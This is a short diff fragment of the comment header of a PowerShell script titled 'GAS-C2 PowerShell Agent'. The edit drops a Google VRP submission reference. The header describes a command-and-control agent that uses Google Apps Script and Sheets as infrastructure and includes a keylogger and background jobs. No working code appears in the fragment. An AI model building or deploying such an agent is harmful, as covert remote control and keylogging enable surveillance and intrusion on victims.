@@ -1,7 +1,7 @@
 ﻿<#
 .SYNOPSIS
     GAS-C2 PowerShell Agent -- Full C2 Framework
-    Security Research / Google VRP Submission
+    Security Research 
 .DESCRIPTION
     Bidirectional C2 agent using Google Apps Script + Sheets as infrastructure.
     Features: persistent runspace, background jobs, keylogger, dynamic reconfig,
